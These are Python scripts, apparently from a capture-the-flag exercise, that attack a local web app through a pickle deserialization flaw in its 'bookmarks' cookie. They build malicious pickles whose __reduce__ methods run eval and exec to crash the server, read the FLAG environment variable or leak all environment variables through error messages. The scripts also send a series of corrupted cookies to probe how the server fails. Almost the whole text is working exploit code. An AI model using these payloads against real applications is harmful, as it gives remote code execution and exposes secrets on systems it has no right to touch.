import requests
import pickle
import base64

target_url = "http://127.0.0.1:32962"

# Payload that tries to modify the session or response headers
class PayloadModify:
    def __reduce__(self):
        # Try to modify something that might be reflected
        import os
        env = dict(os.environ)
        # Return a custom object that when used might leak info
        return (dict, ([('secret_env', env)],))

pickled = pickle.dumps(PayloadModify(), protocol=4)
encoded = base64.b64encode(pickled).decode()

print(f"[*] Payload: {encoded}")

cookies = {"bookmarks": encoded}
headers = {"User-Agent": "Mozilla/5.0"}

response = requests.get(f"{target_url}/list", cookies=cookies, headers=headers, timeout=10)
print(f"[*] Status: {response.status_code}")
print(f"[*] Response headers: {dict(response.headers)}")
print(f"[*] Cookies received: {response.cookies.get_dict()}")
print(f"[*] Response body preview: {response.text[:500]}")

# Try the same with POST to /add
print("\n\n[*] Testing POST to /add...")
response = requests.post(
    f"{target_url}/add", 
    cookies=cookies,
    headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"},
    data={"name": "test", "url": "http://example.com"},
    allow_redirects=True
)
print(f"[*] Final URL: {response.url}")
print(f"[*] Status: {response.status_code}")
print(f"[*] Response body preview: {response.text[:500]}")

# Let's re-examine the original vulnerability confirmation
# The context says sending INVALID_DATA triggers 500
print("\n\n[*] Re-testing invalid data...")
for test_data in ["INVALID_DATA", "gAR9lC4=", "gARdlC4=INVALID", b"\x80\x04INVALID"]:
    if isinstance(test_data, bytes):
        encoded_test = base64.b64encode(test_data).decode()
    else:
        encoded_test = test_data
    
    cookies = {"bookmarks": encoded_test}
    response = requests.get(f"{target_url}/list", cookies=cookies, headers=headers, timeout=5)
    print(f"[*] Test '{encoded_test[:30]}...': Status {response.status_code}")

import requests
import pickle
import base64

target_url = "http://127.0.0.1:32962"
headers = {"User-Agent": "Mozilla/5.0"}

# First, let's verify normal behavior with empty list pickle
empty_list_pickle = pickle.dumps([], protocol=4)
empty_list_b64 = base64.b64encode(empty_list_pickle).decode()
print(f"[*] Original empty list cookie: {empty_list_b64}")

# Test normal behavior
response = requests.get(f"{target_url}/list", cookies={"bookmarks": empty_list_b64}, headers=headers)
print(f"[*] Normal (empty list): Status {response.status_code}")

# The valid pickle might be protocol 4 empty list: gARdlC4=
# Let's try something corrupted
print("\n\n[*] Testing various corrupted pickles...")

corrupted_tests = [
    ("missing data", "gAR="),
    ("invalid protocol", "\x00\x00\x00"),
    ("random bytes base64", base64.b64encode(b"RANDOM_PICKLE_DATA_12345!!!").decode()),
    ("pickle with wrong type", base64.b64encode(pickle.dumps("string", protocol=4)).decode()),
    ("pickle dict", base64.b64encode(pickle.dumps({}, protocol=4)).decode()),
    ("pickle int", base64.b64encode(pickle.dumps(12345, protocol=4)).decode()),
]

for name, test_cookie in corrupted_tests:
    try:
        cookies = {"bookmarks": test_cookie}
        response = requests.get(f"{target_url}/list", cookies=cookies, headers=headers, timeout=5)
        print(f"[*] {name}: Status {response.status_code}")
        if response.status_code == 500:
            print(f"[!] FOUND 500 with: {test_cookie}")
            print(f"Response: {response.text[:2000]}")
            break
    except Exception as e:
        print(f"[*] {name}: Error - {e}")

# Now try the RCE payload again with proper error triggering
print("\n\n[*] Trying RCE payload with exception raising...")

# Create a payload that definitely causes an error the server can't handle
class PayloadRCE:
    def __reduce__(self):
        # Use eval to evaluate a Python expression that accesses os.environ
        return (eval, ('__import__("builtins").__import__("os")._exit(1)',))

pickled = pickle.dumps(PayloadRCE(), protocol=4)
encoded = base64.b64encode(pickled).decode()
print(f"[*] RCE Payload: {encoded}")

cookies = {"bookmarks": encoded}
response = requests.get(f"{target_url}/list", cookies=cookies, headers=headers, timeout=5)
print(f"[*] RCE Test Status: {response.status_code}")

if response.status_code == 500:
    print(f"[!] SERVER CRASHED!")
    print(response.text)

import requests
import pickle
import base64

target_url = "http://127.0.0.1:32962"
headers = {"User-Agent": "Mozilla/5.0"}

# Try using __getinitargs__ which runs during unpickling
class PayloadInitArgs:
    def __getinitargs__(self):
        import os
        env = dict(os.environ)
        # Force an error with env data
        raise RuntimeError(f"INITARGS: {env}")
    
    def __init__(self, *args):
        pass

# Try using __reduce_ex__ with different protocol
class PayloadReduceEx:
    def __reduce_ex__(self, protocol):
        import os
        env_str = str(dict(os.environ))
        # Return something that will cause an error
        return (int, (env_str,))  # int() on string fails

# Try returning non-callable from __reduce__
class PayloadNonCallable:
    def __reduce__(self):
        # Return a string instead of a tuple - causes TypeError
        return "NOT_A_CALLABLE"

# Try __getnewargs__
class PayloadGetNewArgs:
    def __getnewargs__(self):
        import os
        env = dict(os.environ)
        raise Exception(f"GETNEWARGS: {env}")

# Try __getnewargs_ex__  
class PayloadGetNewArgsEx:
    def __getnewargs_ex__(self):
        import os
        env = dict(os.environ)
        raise Exception(f"GETNEWARGS_EX: {env}")

payloads = [
    ("__getinitargs__", PayloadInitArgs()),
    ("__reduce_ex__", PayloadReduceEx()),
    ("non_callable", PayloadNonCallable()),
    ("__getnewargs__", PayloadGetNewArgs()),
    ("__getnewargs_ex__", PayloadGetNewArgsEx()),
]

for name, payload_obj in payloads:
    try:
        pickled = pickle.dumps(payload_obj, protocol=4)
        encoded = base64.b64encode(pickled).decode()
        
        cookies = {"bookmarks": encoded}
        response = requests.get(f"{target_url}/list", cookies=cookies, headers=headers, timeout=5)
        
        print(f"[*] {name}: Status {response.status_code}")
        
        if response.status_code == 500:
            print(f"[!] 500 ERROR FOUND!")
            print(f"Payload: {encoded}")
            print(f"Response: {response.text[:2000]}")
            break
    except Exception as e:
        print(f"[*] {name}: Error - {e}")

# Try the simplest possible error-triggering pickle
print("\n\n[*] Trying simplest error triggers...")

# Just unpickle something that calls a function that doesn't exist
# Can't pickle a lambda, but can use builtins

# Test what happens with exec that sets a variable
class PayloadSetVar:
    def __reduce__(self):
        return (__import__('builtins').exec, ("x = __import__('os').environ.get('FLAG', 'NOFLAG')",))

pickled = pickle.dumps(PayloadSetVar(), protocol=4)
encoded = base64.b64encode(pickled).decode()
print(f"[*] exec setvar payload: {encoded}")

response = requests.get(f"{target_url}/list", cookies={"bookmarks": encoded}, headers=headers)
print(f"[*] Status: {response.status_code}")

